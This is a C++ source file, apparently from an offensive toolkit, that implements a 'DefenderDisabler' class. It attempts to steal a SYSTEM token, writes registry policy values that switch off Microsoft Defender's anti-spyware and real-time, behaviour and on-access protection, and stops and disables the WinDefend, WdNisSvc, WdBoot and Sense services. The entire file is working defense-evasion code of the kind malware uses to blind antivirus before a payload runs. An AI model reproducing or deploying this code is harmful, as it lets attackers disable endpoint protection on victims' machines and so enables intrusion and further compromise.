/**
 * @file DefenderDisabler.cpp
 * @author Gregory King
 * @date August 13, 2025
 * @brief This file contains the implementation of the DefenderDisabler class.
 *
 * Implements the logic for stopping Microsoft Defender services and setting
 * registry keys to disable features like Real-Time Protection. This requires
 * administrator privileges to interact with the Service Control Manager and
 * the HKLM registry hive.
 */

#include "DefenderDisabler.h"
#include "Privilege.h"
#include <Windows.h>
#include <iostream>
#include <vector>

namespace KernelMode {

    bool DefenderDisabler::StopAndDisableService(const std::wstring& serviceName) {
        SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (!scmHandle) {
            std::wcerr << L"[-] Failed to open SCM: " << GetLastError() << std::endl;
            return false;
        }

        SC_HANDLE serviceHandle = OpenServiceW(scmHandle, serviceName.c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_CHANGE_CONFIG);
        if (!serviceHandle) {
            std::wcerr << L"[-] Failed to open service '" << serviceName << "': " << GetLastError() << std::endl;
            CloseServiceHandle(scmHandle);
            return false;
        }

        // Attempt to stop the service
        SERVICE_STATUS status;
        if (ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status)) {
            std::wcout << L"[+] Stop signal sent to '" << serviceName << "' service." << std::endl;
        } else {
            // This may fail if the service is protected, which is expected for Defender.
            std::wcerr << L"[-] Warning: Could not stop service '" << serviceName << "': " << GetLastError() << std::endl;
        }

        // Attempt to disable the service
        if (!ChangeServiceConfigW(serviceHandle, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr)) {
            std::wcerr << L"[-] Failed to disable service '" << serviceName << "': " << GetLastError() << std::endl;
            CloseServiceHandle(serviceHandle);
            CloseServiceHandle(scmHandle);
            return false;
        }

        std::wcout << L"[+] Service '" << serviceName << "' successfully disabled." << std::endl;
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);
        return true;
    }

    bool DefenderDisabler::SetRegistryDword(const std::wstring& subKey, const std::wstring& valueName) {
        HKEY hKey;
        LONG result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, subKey.c_str(), 0, nullptr, REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &hKey, nullptr);
        if (result != ERROR_SUCCESS) {
            std::wcerr << L"[-] Failed to open or create registry key '" << subKey << "': " << result << std::endl;
            return false;
        }

        DWORD value = 1; // 1 typically means "disable" for these policies
        result = RegSetValueExW(hKey, valueName.c_str(), 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
        if (result != ERROR_SUCCESS) {
            std::wcerr << L"[-] Failed to set registry value '" << valueName << "': " << result << std::endl;
            RegCloseKey(hKey);
            return false;
        }

        std::wcout << L"[+] Registry value '" << valueName << L"' set successfully." << std::endl;
        RegCloseKey(hKey);
        return true;
    }

    bool DefenderDisabler::Disable() {
        std::wcout << L"[*] Attempting to disable Microsoft Defender..." << std::endl;
        std::wcout << L"[*] Note: This requires TrustedInstaller privileges. Attempting to elevate..." << std::endl;

        // Stealing SYSTEM token is often a prerequisite for modifying protected services/registry keys.
        if (!Privilege::StealSystemToken()) {
            std::wcerr << L"[-] Failed to elevate to SYSTEM. Defender operations will likely fail." << std::endl;
            // Continue anyway, as some operations might succeed depending on system state.
        }

        bool overallSuccess = true;

        // Target registry keys to disable Defender via Group Policy settings
        const std::wstring defenderKey = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender";
        if (!SetRegistryDword(defenderKey, L"DisableAntiSpyware")) {
            overallSuccess = false;
        }

        const std::wstring rtProtectKey = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection";
        if (!SetRegistryDword(rtProtectKey, L"DisableBehaviorMonitoring")) {
            overallSuccess = false;
        }
        if (!SetRegistryDword(rtProtectKey, L"DisableOnAccessProtection")) {
            overallSuccess = false;
        }
        if (!SetRegistryDword(rtProtectKey, L"DisableRealtimeMonitoring")) {
            overallSuccess = false;
        }

        // Target services
        const std::vector<std::wstring> services = {
            L"WinDefend",      // Windows Defender Antivirus Service
            L"WdNisSvc",       // Windows Defender Antivirus Network Inspection Service
            L"WdBoot",         // Windows Defender Antivirus Boot Driver
            L"Sense"           // Windows Defender Advanced Threat Protection Service
        };

        for (const auto& service : services) {
            if (!StopAndDisableService(service)) {
                overallSuccess = false;
            }
        }

        if (overallSuccess) {
            std::wcout << L"[+] Defender disable operations completed. A reboot may be required for all changes to take effect." << std::endl;
        } else {
            std::wcerr << L"[-] Some Defender disable operations failed. Defender may still be active." << std::endl;
        }

        return overallSuccess;
    }
}